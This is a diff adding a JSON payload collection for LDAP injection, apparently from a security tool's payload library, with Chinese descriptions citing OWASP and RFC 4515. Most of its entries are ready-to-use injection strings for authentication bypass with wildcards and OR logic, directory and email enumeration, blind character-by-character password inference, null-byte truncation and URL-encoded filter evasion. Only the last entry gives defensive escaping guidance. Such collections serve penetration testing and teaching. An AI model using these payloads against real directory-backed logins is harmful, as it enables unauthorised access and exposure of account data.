@@ -1,0 +1,129 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "LDAP 注入",
+  "categories": ["认证绕过", "信息探测", "盲注与带外", "绕过技巧", "检测思路"],
+  "items": [
+    {
+      "id": "ldap-auth-star",
+      "title": "通配符认证绕过",
+      "category": "认证绕过",
+      "code": "*)(uid=*))(|(uid=*",
+      "desc": "闭合原有过滤器并注入通配符条件，使认证查询匹配任意用户。",
+      "tags": ["ldap", "bypass", "auth"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP LDAP Injection"
+    },
+    {
+      "id": "ldap-auth-admin",
+      "title": "指定用户通配口令",
+      "category": "认证绕过",
+      "code": "admin)(|(password=*",
+      "desc": "固定用户名为 admin，再用 OR 注入把口令条件变成通配匹配，从而绕过口令校验。",
+      "tags": ["ldap", "bypass", "auth"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP LDAP Injection"
+    },
+    {
+      "id": "ldap-auth-or",
+      "title": "OR 逻辑注入",
+      "category": "认证绕过",
+      "code": ")(|(uid=admin)(uid=guest)",
+      "desc": "通过注入 OR 逻辑扩大匹配范围，绕过单一用户限制。",
+      "tags": ["ldap", "bypass", "auth"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP LDAP Injection"
+    },
+    {
+      "id": "ldap-enumerate-attr",
+      "title": "枚举属性",
+      "category": "信息探测",
+      "code": "*)(objectClass=*",
+      "desc": "利用通配符列出目录对象，观察返回数量判断过滤强度。",
+      "tags": ["ldap", "enum"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP LDAP Injection"
+    },
+    {
+      "id": "ldap-filter-objectclass",
+      "title": "objectClass 条件",
+      "category": "信息探测",
+      "code": "(&(objectClass=person)(cn=*))",
+      "desc": "按对象类型检索用户条目，用于确认目录结构与字段。",
+      "tags": ["ldap", "enum", "filter"],
+      "vars": [],
+      "risk": "low",
+      "source": "RFC 4515 LDAP 过滤器语法"
+    },
+    {
+      "id": "ldap-filter-mail",
+      "title": "按邮箱检索用户",
+      "category": "信息探测",
+      "code": "(&(objectClass=user)(mail=*@{{domain}}))",
+      "desc": "检索指定域下全部邮箱账号，评估信息暴露面。",
+      "tags": ["ldap", "enum", "mail"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "RFC 4515 LDAP 过滤器语法"
+    },
+    {
+      "id": "ldap-blind-substring",
+      "title": "子串盲注判断",
+      "category": "盲注与带外",
+      "code": "admin)(|(password=a*)",
+      "desc": "通过返回结果差异逐字符推断属性值，需结合自动化。",
+      "tags": ["ldap", "blind"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP LDAP Injection"
+    },
+    {
+      "id": "ldap-blind-error",
+      "title": "错误回显差异",
+      "category": "盲注与带外",
+      "code": "admin)(|(description=*)",
+      "desc": "观察服务端错误信息或响应长度差异，判断注入是否生效。",
+      "tags": ["ldap", "blind", "error"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP LDAP Injection"
+    },
+    {
+      "id": "ldap-null-byte",
+      "title": "空字节截断",
+      "category": "绕过技巧",
+      "code": "admin%00)(uid=*",
+      "desc": "老版本实现可能被空字节截断，现代组件多已修复。",
+      "tags": ["ldap", "bypass", "legacy"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP LDAP Injection"
+    },
+    {
+      "id": "ldap-encode-bypass",
+      "title": "特殊字符编码",
+      "category": "绕过技巧",
+      "code": "%28%7C%28uid%3Dadmin%29",
+      "desc": "对括号与等号做 URL 编码，绕过简单特征匹配。",
+      "tags": ["ldap", "bypass", "encoding"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP LDAP Injection"
+    },
+    {
+      "id": "ldap-escape-note",
+      "title": "正确转义参考（防御）",
+      "category": "检测思路",
+      "code": "\\2a \\28 \\29 \\5c \\00 分别对应 * ( ) \\ NUL",
+      "desc": "RFC 4515 规定特殊字符需转义。若服务端未转义用户输入，则存在注入风险。",
+      "tags": ["ldap", "defense", "reference"],
+      "vars": [],
+      "risk": "low",
+      "source": "RFC 4515"
+    }
+  ]
+}
